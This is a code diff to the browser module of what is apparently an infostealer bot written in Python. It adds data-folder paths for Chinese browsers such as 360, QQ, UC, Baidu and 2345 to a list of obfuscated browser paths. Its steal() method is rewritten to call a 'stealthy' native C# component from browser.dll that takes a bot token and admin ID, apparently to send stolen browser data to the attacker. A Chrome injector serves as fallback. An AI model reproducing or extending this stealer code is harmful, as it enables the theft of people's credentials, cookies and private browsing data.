@@ -22,7 +22,14 @@ class BrowserModule(BaseModule):
             'vivaldi': {'name': 'Vivaldi', 'path': os.path.join(local, decrypt_string('OFsOCiI1MD4GIhldABkiGxpT'))},
             'yandex': {'name': 'Yandex', 'path': os.path.join(local, decrypt_string('N1MWDyspBT4DFgRcF0EkCAFFCw48DQU3KRIYGDZYEhs='))},
             'cent': {'name': 'Cent Browser', 'path': os.path.join(local, decrypt_string('LVcWHwwjNhUpEhhkLmwVHxwSPAo6MA=='))},
-            'chromium': {'name': 'Chromium', 'path': os.path.join(local, decrypt_string('LVoKBCM4LA8GKz9LF0tGPg9GGQ=='))}
+            'chromium': {'name': 'Chromium', 'path': os.path.join(local, decrypt_string('LVoKBCM4LA8GKz9LF0tGPg9GGQ=='))},
+            # Chinese Localized Browsers
+            '360safe': {'name': '360 Safe Browser', 'path': os.path.join(local, '360chrome\\Chrome\\User Data')},
+            '360ee': {'name': '360 Extreme Browser', 'path': os.path.join(local, '360Chrome\\Chrome\\User Data')},
+            'qq': {'name': 'QQ Browser', 'path': os.path.join(local, 'Tencent\\QQBrowser\\User Data')},
+            'uc': {'name': 'UC Browser', 'path': os.path.join(local, 'UCBrowser\\User Data_V7')},
+            'baidu': {'name': 'Baidu Browser', 'path': os.path.join(local, 'Baidu\\BaiduBrowser\\User Data')},
+            '2345': {'name': '2345 Browser', 'path': os.path.join(local, '2345Explorer\\User Data')}
         }
 
     def run(self) -> bool:
@@ -35,16 +42,39 @@ class BrowserModule(BaseModule):
             return False
 
     def steal(self) -> bool:
-        """Steals browser data using direct ChromeElevator execution"""
-        injector = ChromeInjector()
-        if injector.is_available():
+        """Steals browser data using Native C# Orchestrator (Stealthy)"""
+        try:
+            self.log("Invoking native C# BrowserManager for extraction...")
+            import clr
             try:
-                self.log("Running ChromeElevator for full browser extraction...")
-                # Increase timeout to 120s
-                success = injector.run_injector(action="all", timeout=120)
-                return success
-            except Exception as e:
-                self.log(f"ChromeElevator execution failed: {e}")
+                from VanguardCore import BrowserManager
+            except ImportError:
+                # Try reloading/adding reference just in case
+                import os
+                base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+                clr.AddReference(os.path.join(base_dir, "bin", "browser.dll"))
+                from VanguardCore import BrowserManager
+
+            # Access credentials from main
+            import main
+            bot_token = getattr(main, 'BOT_TOKEN', "")
+            admin_id = str(getattr(main, 'ADMIN_ID', "0"))
+            
+            # Run native orchestrator .Result to wait for Task completion
+            success = BrowserManager.Run(bot_token, admin_id, main.BASE_DIR).Result
+            
+            if success:
+                self.log("Native browser extraction and reporting completed successfully.")
+            else:
+                self.log("Native browser extraction failed or no data found.")
+            return success
+        except Exception as e:
+            self.log(f"Native extraction error: {e}")
+            # Fallback to old method if native fails
+            injector = ChromeInjector()
+            if injector.is_available():
+                self.log("Falling back to Python-based ChromeElevator invocation.")
+                return injector.run_injector(action="all", timeout=120)
         return False
 
 class ChromeInjector:
